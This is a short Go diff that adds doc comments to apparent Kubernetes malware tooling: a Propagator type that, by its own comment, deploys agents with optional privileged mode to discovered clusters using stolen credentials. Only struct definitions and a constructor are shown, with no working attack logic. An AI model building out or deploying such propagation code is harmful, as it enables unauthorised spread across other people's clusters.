@@ -11,6 +11,7 @@ import (
 	"k8s.io/client-go/kubernetes"
 )
 
+// DeployOpts configures how the agent is deployed to a target cluster.
 type DeployOpts struct {
 	Image     string
 	Namespace string
@@ -20,11 +21,13 @@ type DeployOpts struct {
 	Privileged bool
 }
 
+// Propagator deploys agents to discovered clusters using stolen credentials.
 type Propagator struct {
 	sourceClient kubernetes.Interface
 	agentImage   string
 }
 
+// NewPropagator creates a Propagator with the given source client and agent container image.
 func NewPropagator(client kubernetes.Interface, agentImage string) *Propagator {
 	return &Propagator{
 		sourceClient: client,
